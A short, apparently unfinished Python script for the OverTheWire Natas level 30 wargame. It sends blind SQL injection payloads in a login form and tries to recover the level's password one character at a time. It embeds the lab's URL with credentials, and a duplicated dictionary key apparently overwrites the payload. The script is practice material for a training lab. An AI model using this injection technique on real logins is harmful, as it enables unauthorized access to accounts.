import requests
import re
import string


CHAR_SET = string.ascii_letters + string.digits
PASSWORD_LENGHT = 32
session = requests.Session()

def natas30(url):
    for char in CHAR_SET:
        # I think it needs to be done like this,
        # see https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure
        # But unsure how to proceed after this
        
        params={"username": 'natas30" and password like binary "{char}%', "username": 30, "password": "x"}
        response = session.post(url, data=params)
        print(response.url)
        if 'fail' in response.text:
            print("FAILED")
        else:
            print(char)
            print("SUCCES")

if __name__ == '__main__':
    url = 'http://natas30:wie9iexae0Daihohv8vuu3cei9wahf0e@natas30.natas.labs.overthewire.org/'
    natas30(url)
